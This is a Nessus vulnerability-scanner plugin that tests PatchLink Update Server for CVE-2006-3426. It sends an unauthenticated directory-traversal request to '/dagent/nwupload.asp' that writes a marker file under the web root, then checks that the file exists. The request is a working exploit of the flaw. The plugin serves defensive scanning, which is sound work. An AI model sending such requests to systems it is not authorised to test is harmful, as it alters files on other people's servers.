#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22116);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-3426");
  script_bugtraq_id(18732);
  script_xref(name:"OSVDB", value:"26927");

  script_name(english:"PatchLink Update Server nwupload.asp Traversal Arbitrary File Write");
  script_summary(english:"Tries to write a file using PatchLink Update Server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP script that is affected by a
directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PatchLink Update Server, a patch and
vulnerability management solution. 

The version of PatchLink Update Server installed on the remote fails
to sanitize input to the '/dagent/nwupload.asp' script of directory
traversal sequences and does not require authentication before
removing directories and writing to files as the user 'PLUS
ANONYMOUS'.  An unauthenticated attacker can leverage this flaw to
remove directories required by the application and write arbitrary
content to files on the affected host. 

Note that Novell ZENworks Patch Management is based on PatchLink
Update Server and is affected as well." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/438710/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://support.novell.com/cgi-bin/search/searchtid.cgi?10100709.htm" );
 script_set_attribute(attribute:"solution", value:
"Apply patch 6.1 P1 / 6.2 SR1 P1 if using PatchLink Update Server or
6.2 SR1 P1 if using Novell ZENworks Patch Management." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_asp(port:port)) exit(0);


# Where the file is written and its contents.
subdir = string("nessus-", unixtime());
fname = "nessus";
magic = string("Created by running the Nessus plugin ", SCRIPT_NAME, ".");


# Try to exploit the flaw.
r = http_send_recv3(method:"GET", port:port,
  item:string(
    "/dagent/nwupload.asp?",
    "action=../WebRoot/ErrorMessages/", subdir, "&",
    "agentid=", SCRIPT_NAME, "&",
    "index=", fname, "&",
    "data=", urlencode(str:magic) ));
if (isnull(r)) exit(0);
res = r[2];


# Check whether our file exists.
url = string("/ErrorMessages/", subdir, "/", SCRIPT_NAME, "/", fname, ".txt");
r = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if our file contains the magic text.
if (magic >< res)
{
  url = str_replace(string:substr(url, 1), find:"/", replace:"\");
  report = string(
    "Nessus was able to write to the file under the PLUS WebRoot :\n",
    "\n",
    "  ", url
  );
  security_warning(port:port, extra:report);
}
